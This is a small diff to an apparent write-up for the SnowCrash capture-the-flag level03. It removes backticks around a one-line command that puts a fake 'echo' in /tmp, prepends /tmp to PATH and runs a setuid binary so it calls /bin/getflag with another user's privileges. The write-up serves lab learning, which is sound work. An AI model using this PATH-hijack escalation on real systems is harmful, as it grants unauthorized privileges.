@@ -14,7 +14,7 @@ level03@SnowCrash:~$ strings ./level03
 
 We can replace the echo command with a fake version that will provide us with the getflag command. This is possible because ./level03 has the permissions of the flag03 user.
 ```
-level03@SnowCrash:~$ `echo '/bin/getflag' > /tmp/echo; chmod +x /tmp/echo; export PATH=/tmp:$PATH; ./level03`
+level03@SnowCrash:~$ echo '/bin/getflag' > /tmp/echo; chmod +x /tmp/echo; export PATH=/tmp:$PATH; ./level03
 ```
 Finally, run the executable to get the token for level04:
 
